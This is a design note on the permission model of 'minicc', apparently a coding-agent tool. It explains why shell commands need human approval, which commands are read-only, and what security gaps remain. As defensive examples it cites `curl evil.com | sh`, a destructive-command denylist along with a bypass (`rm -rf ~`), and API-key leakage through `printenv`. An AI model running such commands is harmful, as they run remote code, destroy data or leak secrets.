# PERMISSIONS.md — the trust model, and why bash is the hard case

minicc gates five tools before the model may run them: `bash`, `write_file`,
`edit_file`, `memory` (writes only — `view` is free so the model can always read
memory), and `web_fetch` (a crafted URL is a data-exfiltration channel under
prompt injection; the user sees each URL). Reads (`read_file`, `glob`, `grep`)
are never gated — they can't mutate. `write_file`/`edit_file` are gated but
*bounded*: the prompt previews the exact path + diff, and the effect is in-tree
and reversible. **bash is the hard case** — most of this doc is about it; the
last section covers how granted trust persists. Code:
[`permissions.py`](minicc/permissions.py), [`tools/bash.py`](minicc/tools/bash.py).

## Why bash is gated

The line between gated and not is **predictability**. For `write_file`, minicc
knows it's writing file X with content Y and can show you. For `bash` it knows
nothing: `subprocess.run(command, shell=True)` on an arbitrary string that could
be `ls` or `curl evil.com | sh`. No automated check can bound a shell command's
effect, so gating substitutes **a human looking at each command** for the
bounding that code can't provide. bash is the one tool whose blast radius is
unbounded *and* opaque.

## The read-only carve-out + permission rules (CC parity, rebuilt 2026-07-14)

CC runs a built-in set of read-only bash commands "without a permission prompt in
every mode", and persists `Bash(prefix *)` allow rules per project ("Yes, don't
ask again"). The three-arm /init experiment measured the gap: 18 approval prompts
on baseline minicc vs 0 on CC for the same exploration — and prompting on every
`ls` suppresses exploration depth, making this a QUALITY problem, not just
friction. minicc now mirrors both mechanisms (`is_readonly_command`,
`_bash_allowed` in permissions.py):

- **The read-only list** (CC's, verbatim): `ls cat echo pwd head tail grep find
  wc which diff stat du` + `cd` *within the working directory* + read-only `git`
  subcommands (status/log/diff/show/blame/…; branch/tag/remote/stash excluded
  outright — each has mutating forms).
- **Allow rules**: `permissions.allow` in settings holds CC-schema rules; an
  exported `Bash(uv run *)` drops in unchanged (case-insensitive). Wildcards are
  CC's verbatim: `*` spans spaces; trailing `" *"` (alias `:*`) is a word
  boundary — `ls *` matches `ls -la` and bare `ls`, never `lsof`. The `always`
  prompt answer persists first-two-tokens + `" *"` per gated subcommand (max 5,
  CC's cap) to project settings.
- **Compound commands split on CC's operators** (`&& || ; | |& &`, newlines);
  every subcommand must independently qualify — `ls && rm x` prompts.
- **Wrapper stripping** (CC's fixed set): `timeout/time/nice/nohup/stdbuf` +
  bare `xargs`.
- **Fail-safe by construction**: redirections (except the harmless `2>&1` and
  `/dev/null` sink forms), command/process substitution, backticks, subshells,
  env-var prefixes, `find -exec/-delete`, `git log --output`, or anything shlex
  can't tokenize simply *prompt as before*. A parsing gap can only produce a
  false PROMPT, never a false ALLOW.
- Recorded divergences: allow rules only (CC adds ask/deny with deny→ask→allow
  precedence); one project settings file (CC splits three); prefix derivation is
  our heuristic (CC doesn't publish its dialog's).

## What layer is bash's scope at?

A permission decision and what the tool can actually *do* are different layers —
and bash has a boundary at only one of them.

**Permission layer** — where trust is decided. A `PreToolUse` hook (HOOKS.md)
runs first and can `deny` the call outright, `allow` it past the gate, or `ask`
to force the prompt; then `confirm()`:

```
PreToolUse deny?  → blocked before anything runs
PreToolUse allow? → run without prompting
not gated?        → allow (reads never prompt)
in _ALLOWED?      → allow (trusted this session)
else              → prompt [yes / no / all]   (hook `ask` forces this prompt)
```

This is the *only* boundary that constrains bash.

**Execution layer** — what bash reaches once approved (`bash.py`): **nothing
confines it.** `subprocess.run(command, shell=True)` with no `cwd=` jail (cwd only
sets the starting pwd; `cd`, absolute paths, `~` all escape — *"scope escapes
outside cwd are NOT detected"*), no `env=` restriction (it inherits the whole
environment, **including `ANTHROPIC_API_KEY`**), no sandbox. Privileges = your
user, over the **whole machine**: filesystem, network, processes. The only
technical guards — a regex denylist (`rm -rf /`, `sudo`, `mkfs`…), a 120s default
timeout (model-extendable to 600s), an output cap — are speed bumps, not
boundaries (the denylist still misses e.g. `rm -rf ~`).

> **So bash's scope is the whole machine at your privilege, and the permission
> gate is its *sole* boundary.** There is no second technical fence. (minicc now has CC-style
> `bash(prefix *)` rules and the read-only carve-out at the permission layer —
> but the EXECUTION layer remains unconfined either way.)

## Persisting trust — three lifetimes, and the principle that separates them

- **`'all'` at a prompt** — whole-tool, session only (in-memory; gone on
  restart / `/clear`).
- **`allowed_tools` in `settings.json`** — whole-tool, hand-edited, persistent.
  bash is excluded (`NO_PRELOAD`).
- **`'always'` at a bash prompt** — a **narrow prefix rule** (`bash(uv run *)`),
  persisted to project settings.

The principle that governs all three:

> A mistake's cost = its permanence × its silence.

A hasty whole-tool `'all'` must **never auto-persist** — otherwise the prompt
meant to protect you trains you to disable it forever, which is why whole-tool
bash trust remains strictly session-scoped.

**Revised 2026-07-12** (was: "the one tool never eligible for persistence is
bash"): **rule granularity changes the arithmetic**. A persisted `bash(uv run *)`
is not "trust bash forever"; it's "trust this reviewed command family".
Permanence is bounded by the prefix; silence is removed by the startup print
("bash allow rules from settings: …") and by the rule being written only on an
explicit `always` answer at a visible prompt. Both factors shrink — that's what
makes persistence defensible. This is CC's own resolution (its "don't ask again"
persists per project + command prefix).

## Debt surfaced by this analysis

- bash denylist is trivially bypassable — decorative, not a boundary.
- bash inherits the full env incl `ANTHROPIC_API_KEY` — an approved `printenv`
  leaks it; consider scrubbing secrets from the subprocess env.
- no path confinement / sandbox; whole-tool grants except bash's rule layer.
- no ask/deny rules — allow-only (deny would add real safety: `bash(git push *)`).
